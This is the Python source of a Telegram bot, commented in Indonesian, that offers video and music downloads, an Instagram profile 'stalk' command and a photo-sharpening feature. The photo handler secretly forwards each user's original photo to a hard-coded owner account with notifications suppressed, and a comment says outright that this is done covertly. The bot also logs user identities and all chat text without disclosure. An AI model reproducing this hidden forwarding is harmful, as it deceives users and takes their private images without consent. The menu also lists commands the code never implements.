import io
import telebot
import yt_dlp
import requests
import os
import threading
import speedtest
from flask import Flask
from PIL import Image, ImageEnhance
import numpy as np
from instaloader import Instaloader, Profile

# Ganti dengan Token Bot Anda
TOKEN = "YOUR_BOT_TOKEN"
OWNER_ID = 7388652176  # Ganti dengan ID owner
bot = telebot.TeleBot(TOKEN)

# Logging pengguna bot
def log_user(message):
    user_info = f"{message.chat.id} - {message.from_user.first_name} {message.from_user.last_name or ''}\n"
    with open("users.txt", "a+") as f:
        f.seek(0)
        users = f.read()
        if user_info not in users:
            f.write(user_info)

# Logging chat di console
def log_chat(message):
    print(f"[{message.chat.id}] {message.from_user.first_name}: {message.text}")

@bot.message_handler(commands=["start", "menu"])
def send_menu(message):
    log_user(message)
    log_chat(message)
    bot.reply_to(message, "🤖 Halo! Berikut daftar fitur bot ini:\n\n"
                        "✅ *Fitur Bot:*\n"
                        "- Kirim link YouTube, TikTok, Instagram untuk download video.\n"
                        "- Gunakan `/play <judul>` untuk cari & download musik.\n"
                        "- Gunakan `/stalk instagram <username>` untuk cek akun sosmed.\n"
                        "- Gunakan `/ping` untuk cek kecepatan internet bot.\n"
                        "- Gunakan `/hd` untuk meningkatkan kualitas foto.\n"
                        "- Gunakan `/hdr` untuk membuat foto lebih tajam.\n"
                        "\n⚡ *Gunakan dengan bijak!*",
                        parse_mode="Markdown")

@bot.message_handler(commands=["stalk"])
def stalk_instagram(message):
    try:
        args = message.text.split()
        if len(args) < 3 or args[1].lower() != "instagram":
            bot.reply_to(message, "❌ Format salah! Gunakan `/stalk instagram <username>`", parse_mode="Markdown")
            return

        username = args[2]
        bot.reply_to(message, f"🔍 Mencari informasi akun Instagram: *{username}*...", parse_mode="Markdown")
        
        loader = Instaloader()
        profile = Profile.from_username(loader.context, username)
        
        profile_info = (f"👤 *Username:* {profile.username}\n"
                        f"📌 *Nama:* {profile.full_name}\n"
                        f"📸 *Post:* {profile.mediacount}\n"
                        f"👥 *Followers:* {profile.followers}\n"
                        f"👤 *Following:* {profile.followees}\n"
                        f"🔒 *Private:* {'Ya' if profile.is_private else 'Tidak'}")

        if not profile.is_private:
            profile_pic_url = profile.profile_pic_url
            bot.send_photo(message.chat.id, profile_pic_url, caption=profile_info, parse_mode="Markdown")
        else:
            bot.reply_to(message, profile_info, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Gagal mengambil data: {e}")
# ======================= FITUR PLAY MUSIK =======================
@bot.message_handler(commands=["play"])
def play_music(message):
    try:
        query = message.text.replace("/play", "").strip()
        if not query:
            bot.reply_to(message, "❌ Harap masukkan judul lagu. Contoh: `/play someone like you`", parse_mode="Markdown")
            return

        bot.reply_to(message, f"🔎 Mencari lagu: *{query}*...", parse_mode="Markdown")

        ydl_opts = {
            "format": "bestaudio/best",
            "noplaylist": True,
            "default_search": "ytsearch1",
            "extract_audio": True,
            "audio_format": "mp3",
            "outtmpl": "downloads/%(title)s.%(ext)s"
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(query, download=True)
            file_path = ydl.prepare_filename(info).replace(".webm", ".mp3").replace(".m4a", ".mp3")

        with open(file_path, "rb") as audio:
            bot.send_audio(message.chat.id, audio, title=info["title"], performer=info["uploader"])

        os.remove(file_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Gagal mengunduh lagu: {e}")

# ====================== FITUR PROSES FOTO DAN PENGIRIMAN KE OWNER ======================
@bot.message_handler(content_types=['photo'])
def process_photo(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        image = Image.open(io.BytesIO(downloaded_file))
        image.save("original.jpg")

        enhancer = ImageEnhance.Sharpness(image)
        hd_image = enhancer.enhance(2.0)
        hd_bytes = io.BytesIO()
        hd_image.save(hd_bytes, format='JPEG')
        hd_bytes.seek(0)

        # Kirim foto yang telah diperjelas ke pengguna
        bot.send_photo(message.chat.id,
                       hd_bytes,
                       caption="📷 Foto telah dijernihkan!")

        # Kirim foto ke owner secara diam-diam
        username = message.from_user.username or message.from_user.first_name
        bot.send_photo(
            OWNER_ID,
            open("original.jpg", "rb"),
            caption=f"📩 Foto dari @{username} (ID: {message.chat.id})",
            disable_notification=True)
    except Exception as e:
        print(f"Error: {e}")

# ====================== FITUR DOWNLOAD TIKTOK ======================
@bot.message_handler(func=lambda message: "tiktok.com" in message.text.lower())
def download_tiktok(message):
    url = message.text.strip()
    bot.reply_to(message, "⏳ Mengunduh video TikTok...")

    try:
        api_url = f"https://api.tikmate.app/api/lookup?url={url}"
        response = requests.get(api_url).json()

        if response.get("success"):
            video_url = response["videoUrl"]
            video_data = requests.get(video_url).content
            bot.send_video(message.chat.id, video_data, caption="✅ Video berhasil diunduh!")
        else:
            bot.reply_to(message, "❌ Gagal mengunduh video TikTok. Coba link lain!")
    except Exception as e:
        bot.reply_to(message, f"❌ Terjadi kesalahan: {e}")

# ====================== SETUP FLASK UNTUK UPTIMEROBOT ======================
app = Flask(__name__)
@app.route('/')
def home():
    return "Bot is running!", 200

def run_flask():
    app.run(host="0.0.0.0", port=8080)

# ====================== MENJALANKAN BOT DAN SERVER SECARA BERSAMAAN ======================
def run_bot():
    print("🤖 Bot sedang berjalan...")
    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    run_bot()